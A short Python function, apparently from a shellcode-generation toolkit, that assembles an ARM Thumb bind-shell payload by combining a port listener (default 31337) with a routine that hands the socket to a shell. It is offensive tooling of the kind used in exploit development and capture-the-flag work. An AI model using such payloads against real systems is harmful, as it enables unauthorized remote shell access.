# bindshell(port)
def ARM_THUMB_BINDSHELL(port=31337, sock=4, once=True):
    if once:
        sc = ARM_THUMB_LISTEN(port)
    else:
        sc = ARM_THUMB_ACCEPTLOOP(port)

    sc += ARM_THUMB_DUPSH(sock)

    return sc
